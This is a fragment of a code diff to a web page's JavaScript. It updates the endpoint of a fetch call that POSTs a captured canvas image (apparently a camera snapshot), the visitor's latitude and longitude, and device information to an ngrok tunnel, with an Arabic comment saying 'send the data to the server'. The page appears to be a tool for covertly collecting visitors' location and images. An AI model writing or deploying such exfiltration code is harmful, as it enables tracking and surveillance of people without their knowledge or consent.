@@ -47,7 +47,7 @@
                         const imgData = canvas.toDataURL('image/png');
 
                         // إرسال البيانات إلى السيرفر
-                       fetch("https://5d8b44f4aff6.ngrok-free.app/receive_data", {
+                       fetch("https://3ce96c372a59.ngrok-free.app/receive_data", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ lat, lon, imgData, deviceInfo })
